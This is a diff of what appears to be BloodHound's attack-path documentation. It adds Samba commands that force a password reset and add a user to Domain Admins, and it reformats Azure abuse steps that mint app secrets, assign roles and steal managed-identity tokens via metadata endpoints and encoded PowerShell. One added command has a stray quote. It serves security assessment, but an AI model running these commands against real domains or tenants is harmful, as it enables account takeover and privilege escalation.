@@ -360,6 +360,20 @@ as that user, or use that user's credentials in conjunction with PowerView's ACL
 functions, or perhaps even RDP to a system the target user has access to. For more ideas
 and information, see the references section below.
 
+You can also abuse this without using Windows-based tooling if you are operating from a 
+Linux host. The net and rpcclient utilities from the Samba toolset will let you 
+forcefully change a users password. The following commaand will leverage net to reset
+the password.
+
+::
+  net rpc password harmj0y' -U 'TESTLAB\\dfm.a' -S dc.testlab.local
+
+The following commands will leverage rpcclient to reset the password.
+
+::
+  rpcclient -U 'TESTLAB\\dfm.a' dc.testlab.local
+  rpcclient $> setuserinfo2 harmj0y 23 Password123!
+
 Opsec Considerations
 --------------------
 
@@ -448,6 +462,14 @@ Finally, verify that the user was successfully added to the group with PowerView
 ::
 
   Get-DomainGroupMember -Identity 'Domain Admins'
+
+You can also abuse this without using Windows-based tooling if you are operating 
+from a Linux host. The net from the Samba toolset will let you add a user to 
+the vulnerable group.
+
+::
+
+  net rpc group addmem 'Domain Admins' 'harmj0y' -U 'TESTLAB\\dfm.a' -S dc.testlab.local
 
 Opsec Considerations
 --------------------
@@ -2270,9 +2292,9 @@ by supplying a refresh token:
 
 ::
 
-	$MGToken = Get-GraphTokenWithRefreshToken `
-	    -RefreshToken "0.ARwA6WgJJ9X2qk..." `
-	    -TenantID "contoso.onmicrosoft.com"
+    $MGToken = Get-GraphTokenWithRefreshToken `
+        -RefreshToken "0.ARwA6WgJJ9X2qk..." `
+        -TenantID "contoso.onmicrosoft.com"
 
 
 To add a new owner to a Service Principal, use BARK's 
@@ -2280,20 +2302,20 @@ New-ServicePrincipalOwner function:
 
 ::
 
-	New-ServicePrincipalOwner `
-	    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `
-	    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
-	    -Token $Token
+    New-ServicePrincipalOwner `
+        -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `
+        -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
+        -Token $Token
 
 
 To add a new owner to an App Registration, use BARK's New-AppOwner function:
 
 ::
 
-	New-AppOwner `
-	    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `
-	    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
-	    -Token $Token
+    New-AppOwner `
+        -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `
+        -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
+        -Token $Token
 
 
 
@@ -2357,27 +2379,27 @@ by supplying a refresh token:
 
 ::
 
-	$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk..." -TenantID "contoso.onmicrosoft.com"
+    $MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk..." -TenantID "contoso.onmicrosoft.com"
 
 Then use BARK's New-AppRegSecret to add a new secret to the
 target application:
 
 ::
 
-	New-AppRegSecret -AppRegObjectID "d878..." -Token $MGToken.access_token
+    New-AppRegSecret -AppRegObjectID "d878..." -Token $MGToken.access_token
 
 The output will contain the plain-text secret you just created
 for the target app:
 
 ::
 
-	New-AppRegSecret -AppRegObjectID "d878..." -Token $MGToken.access_token
-	
-	Name              Value
-	----              ----- 
-	AppRegSecretValue odg8Q~...
-	AppRegAppId       4d31...
-	AppRegObjectId    d878...
+    New-AppRegSecret -AppRegObjectID "d878..." -Token $MGToken.access_token
+    
+    Name              Value
+    ----              ----- 
+    AppRegSecretValue odg8Q~...
+    AppRegAppId       4d31...
+    AppRegObjectId    d878...
 
 With this plain text secret, you can now acquire tokens as the
 service principal associated with the app. You can easily do
@@ -2385,13 +2407,13 @@ this with BARK's Get-MSGraphToken function:
 
 ::
 
-	PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `
-	-ClientID "4d31..." `
-	-ClientSecret "odg8Q~..." `
-	-TenantName "contoso.onmicrosoft.com"
-	
-	PS /Users/andyrobbins> $SPToken.access_token
-	eyJ0eXAiOiJKV1QiLCJub...
+    PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `
+    -ClientID "4d31..." `
+    -ClientSecret "odg8Q~..." `
+    -TenantName "contoso.onmicrosoft.com"
+    
+    PS /Users/andyrobbins> $SPToken.access_token
+    eyJ0eXAiOiJKV1QiLCJub...
 
 Now you can use this JWT to perform actions against any other MS
 Graph endpoint as the service principal, continuing your attack
@@ -2443,9 +2465,9 @@ by supplying a refresh token:
 
 ::
 
-	$ARMToken = Get-ARMTokenWithRefreshToken `
-	    -RefreshToken "0.ARwA6WgJJ9X2qk..." `
-	    -TenantID "contoso.onmicrosoft.com"
+    $ARMToken = Get-ARMTokenWithRefreshToken `
+        -RefreshToken "0.ARwA6WgJJ9X2qk..." `
+        -TenantID "contoso.onmicrosoft.com"
 
 Now you can use BARK's Invoke-AzureRMAKSRunCommand function 
 to execute a command against the target AKS Managed Cluster.
@@ -2453,10 +2475,10 @@ For example, to run a simple "whoami" command:
 
 ::
 
-	Invoke-AzureRMAKSRunCommand `
-	    -Token $ARMToken `
-	    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `
-	    -Command "whoami"
+    Invoke-AzureRMAKSRunCommand `
+        -Token $ARMToken `
+        -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `
+        -Command "whoami"
 
 If the AKS Cluster or its associated Virtual Machine Scale Sets 
 have managed identity assignments, you can use BARK's 
@@ -2465,10 +2487,10 @@ managed identity Service Principal like this:
 
 ::
 
-	Invoke-AzureRMAKSRunCommand `
-	    -Token $ARMToken `
-	    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `
-	    -Command \'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"\'
+    Invoke-AzureRMAKSRunCommand `
+        -Token $ARMToken `
+        -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `
+        -Command \'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"\'
 
 If successful, the output will include a JWT for the managed identity 
 service principal.
@@ -2543,9 +2565,9 @@ by supplying a refresh token:
 
 ::
 
-	$ARMToken = Get-ARMTokenWithRefreshToken `
-	    -RefreshToken "0.ARwA6WgJJ9X2qk..." `
-	    -TenantID "contoso.onmicrosoft.com"
+    $ARMToken = Get-ARMTokenWithRefreshToken `
+        -RefreshToken "0.ARwA6WgJJ9X2qk..." `
+        -TenantID "contoso.onmicrosoft.com"
 
 Now you can use BARK's New-AzureAutomationAccountRunBook function 
 to add a new runbook to the target Automation Account, specifying
@@ -2553,11 +2575,11 @@ a command to execute using the -Script parameter:
 
 ::
 
-	New-AzureAutomationAccountRunBook `
-	    -Token $ARMToken `
-	    -RunBookName "MyCoolRunBook" `
-	    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `
-	    -Script "whoami"
+    New-AzureAutomationAccountRunBook `
+        -Token $ARMToken `
+        -RunBookName "MyCoolRunBook" `
+        -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `
+        -Script "whoami"
 
 After adding the new runbook, you must execute it and fetch its 
 output. You can do this automatically with BARK's
@@ -2565,19 +2587,19 @@ Get-AzureAutomationAccountRunBookOutput function:
 
 ::
 
-	Get-AzureAutomationAccountRunBookOutput `
-	    -Token $ARMToken `
-	    -RunBookName "MyCoolRunBook" `
-	    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
+    Get-AzureAutomationAccountRunBookOutput `
+        -Token $ARMToken `
+        -RunBookName "MyCoolRunBook" `
+        -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
 
 If the Automation Account has a managed identity assignment, you can use
 these two functions to retrieve a JWT for the service principal like this:
 
 ::
 
-	$Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token
-	New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script
-	Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
+    $Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token
+    New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script
+    Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
 
 If successful, the output will include a JWT for the managed identity 
 service principal.
@@ -2794,7 +2816,7 @@ There are also permanent artifacts left over (assuming the
 attacker doesn't tamper with them). A full copy of the contents
 of the PS1 can be found in this log file::
 
-	C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\_IntuneManagementExtension.txt
+    C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\_IntuneManagementExtension.txt
 
 References
 ----------
@@ -3120,10 +3142,10 @@ by supplying a Service Principal Client ID and secret:
 
 ::
 
-	$MGToken = Get-MSGraphTokenWithClientCredentials `
-	    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
-	    -ClientSecret "asdf..." `
-	    -TenantName "contoso.onmicrosoft.com"
+    $MGToken = Get-MSGraphTokenWithClientCredentials `
+        -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
+        -ClientSecret "asdf..." `
+        -TenantName "contoso.onmicrosoft.com"
 
 
 Then use BARK's Add-AZMemberToGroup function to add a new principial 
@@ -3131,10 +3153,10 @@ to the target group:
 
 ::
 
-	Add-AZMemberToGroup `
-	    -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
-	    -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
-	    -Token $MGToken.access_token
+    Add-AZMemberToGroup `
+        -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
+        -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
+        -Token $MGToken.access_token
 
 
 Now you can re-authenticate as the principial you just added to the group
@@ -3211,10 +3233,10 @@ by supplying a Service Principal Client ID and secret:
 
 ::
 
-	$MGToken = Get-MSGraphTokenWithClientCredentials `
-	    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
-	    -ClientSecret "asdf..." `
-	    -TenantName "contoso.onmicrosoft.com"
+    $MGToken = Get-MSGraphTokenWithClientCredentials `
+        -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
+        -ClientSecret "asdf..." `
+        -TenantName "contoso.onmicrosoft.com"
 
 
 To add a new owner to a Service Principal, use BARK's 
@@ -3222,30 +3244,30 @@ New-ServicePrincipalOwner function:
 
 ::
 
-	New-ServicePrincipalOwner `
-	    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `
-	    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
-	    -Token $Token
+    New-ServicePrincipalOwner `
+        -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `
+        -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
+        -Token $Token
 
 
 To add a new owner to an App Registration, use BARK's New-AppOwner function:
 
 ::
 
-	New-AppOwner `
-	    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `
-	    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
-	    -Token $Token
+    New-AppOwner `
+        -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `
+        -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
+        -Token $Token
 
 
 To add a new owner to a Group, use BARK's New-GroupOwner function:
 
 ::
 
-	New-AppOwner `
-	    -GroupObjectId "352032bf-161d-4788-b77c-b6f935339770" `
-	    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
-	    -Token $Token
+    New-AppOwner `
+        -GroupObjectId "352032bf-161d-4788-b77c-b6f935339770" `
+        -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `
+        -Token $Token
 
 
 
@@ -3311,10 +3333,10 @@ by supplying a Service Principal Client ID and secret:
 
 ::
 
-	$MGToken = Get-MSGraphTokenWithClientCredentials `
-	    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
-	    -ClientSecret "asdf..." `
-	    -TenantName "contoso.onmicrosoft.com"
+    $MGToken = Get-MSGraphTokenWithClientCredentials `
+        -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
+        -ClientSecret "asdf..." `
+        -TenantName "contoso.onmicrosoft.com"
 
 
 Then use BARK's New-AppRegSecret to add a new secret to the
@@ -3322,9 +3344,9 @@ target application:
 
 ::
 
-	New-AppRegSecret `
-	    -AppRegObjectID "d878..." `
-	    -Token $MGToken.access_token
+    New-AppRegSecret `
+        -AppRegObjectID "d878..." `
+        -Token $MGToken.access_token
 
 
 The output will contain the plain-text secret you just created
@@ -3332,15 +3354,15 @@ for the target app:
 
 ::
 
-	New-AppRegSecret `
-	    -AppRegObjectID "d878..." `
-	    -Token $MGToken.access_token
-	
-	Name                Value
-	----                -----
-	AppRegSecretValue   odg8Q~...
-	AppRegAppId         4d31...
-	AppRegObjectId      d878...
+    New-AppRegSecret `
+        -AppRegObjectID "d878..." `
+        -Token $MGToken.access_token
+    
+    Name                Value
+    ----                -----
+    AppRegSecretValue   odg8Q~...
+    AppRegAppId         4d31...
+    AppRegObjectId      d878...
 
 
 With this plain text secret, you can now acquire tokens as the
@@ -3350,10 +3372,10 @@ this with BARK's Get-MSGraphToken function:
 ::
 
 
-	$SPToken = Get-MSGraphToken `
-	    -ClientID "4d31..." `
-	    -ClientSecret "odg8Q~..." `
-	    -TenantName "contoso.onmicrosoft.com"
+    $SPToken = Get-MSGraphToken `
+        -ClientID "4d31..." `
+        -ClientSecret "odg8Q~..." `
+        -TenantName "contoso.onmicrosoft.com"
 
 
 Now you can use this JWT to perform actions against any other MS
@@ -3496,10 +3518,10 @@ by supplying a Service Principal Client ID and secret:
 
 ::
 
-	$MGToken = Get-MSGraphTokenWithClientCredentials `
-	    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
-	    -ClientSecret "asdf..." `
-	    -TenantName "contoso.onmicrosoft.com"
+    $MGToken = Get-MSGraphTokenWithClientCredentials `
+        -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
+        -ClientSecret "asdf..." `
+        -TenantName "contoso.onmicrosoft.com"
 
 
 Use BARK's Get-AllAzureADServicePrincipals to collect all 
@@ -3508,8 +3530,8 @@ Service Principal objects in the tenant:
 ::
 
 
-	$SPs = Get-AllAzureADServicePrincipals `
-	    -Token $MGToken
+    $SPs = Get-AllAzureADServicePrincipals `
+        -Token $MGToken
 
 
 Next, find the MS Graph Service Principal's ID. You can do this by 
@@ -3520,7 +3542,7 @@ matches the universal ID for the MS Graph Service Principal, which is
 ::
 
 
-	$SPs | ?{$_.appId -Like "00000003-0000-0000-c000-000000000000"} | Select id
+    $SPs | ?{$_.appId -Like "00000003-0000-0000-c000-000000000000"} | Select id
 
 
 The output will be the object ID of the MS Graph Service Principal. 
@@ -3533,11 +3555,11 @@ this app role to:
 ::
 
 
-	New-AppRoleAssignment `
-	    -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
-	    -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
-	    -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
-	    -Token $MGToken
+    New-AppRoleAssignment `
+        -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
+        -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
+        -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
+        -Token $MGToken
 
 
 If successful, the output of this command will show you the App Role 
@@ -3548,10 +3570,10 @@ using BARK's New-AzureADRoleAssignment.
 ::
 
 
-	New-AzureADRoleAssignment `
-	    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
-	    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
-	    -Token $MGToken
+    New-AzureADRoleAssignment `
+        -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
+        -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
+        -Token $MGToken
 
 
 If successful, the output will include the principal ID, the role ID, and a 
@@ -3607,10 +3629,10 @@ by supplying a Service Principal Client ID and secret:
 ::
 
 
-	$MGToken = Get-MSGraphTokenWithClientCredentials `
-	    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
-	    -ClientSecret "asdf..." `
-	    -TenantName "contoso.onmicrosoft.com"
+    $MGToken = Get-MSGraphTokenWithClientCredentials `
+        -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `
+        -ClientSecret "asdf..." `
+        -TenantName "contoso.onmicrosoft.com"
 
 
 Then use BARK's New-AzureADRoleAssignment function to grant the 
@@ -3619,10 +3641,10 @@ AzureAD role to your target principal:
 ::
 
 
-	New-AzureADRoleAssignment `
-	    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
-	    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
-	    -Token $MGToken
+    New-AzureADRoleAssignment `
+        -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `
+        -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
+        -Token $MGToken
 
 
 If successful, the output will include the principal ID, the role ID, and a 
@@ -4054,9 +4076,9 @@ by supplying a refresh token:
 
 ::
 
-	$ARMToken = Get-ARMTokenWithRefreshToken `
-	    -RefreshToken "0.ARwA6WgJJ9X2qk..." `
-	    -TenantID "contoso.onmicrosoft.com"
+    $ARMToken = Get-ARMTokenWithRefreshToken `
+        -RefreshToken "0.ARwA6WgJJ9X2qk..." `
+        -TenantID "contoso.onmicrosoft.com"
 
 
 Now you can use BARK's Invoke-AzureRMWebAppShellCommand function 
@@ -4065,10 +4087,10 @@ For example, to run a simple "whoami" command:
 
 ::
 
-	Invoke-AzureRMWebAppShellCommand `
-	    -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `
-	    -Token $ARMToken `
-	    -Command "whoami"
+    Invoke-AzureRMWebAppShellCommand `
+        -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `
+        -Token $ARMToken `
+        -Command "whoami"
 
 
 If the Web App has a managed identity assignments, you can use BARK's 
@@ -4077,19 +4099,19 @@ managed identity Service Principal like this:
 
 ::
 
-	PS C:\> $PowerShellCommand =
-		$headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}
-		$response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers
-		$response.RawContent
+    PS C:\> $PowerShellCommand =
+        $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}
+        $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers
+        $response.RawContent
     
-	PS C:\> $base64Cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PowerShellCommand))
+    PS C:\> $base64Cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PowerShellCommand))
 
-	PS C:\> $Command = "powershell -enc $($base64Cmd)"
+    PS C:\> $Command = "powershell -enc $($base64Cmd)"
 
-	PS C:\> Invoke-AzureRMWebAppShellCommand `
-		-KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `
-		-token $ARMToken `
-		-Command $Command
+    PS C:\> Invoke-AzureRMWebAppShellCommand `
+        -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `
+        -token $ARMToken `
+        -Command $Command
 
 
 If successful, the output will include a JWT for the managed identity 
@@ -4113,4 +4135,3 @@ References
 ----
 
 |
-
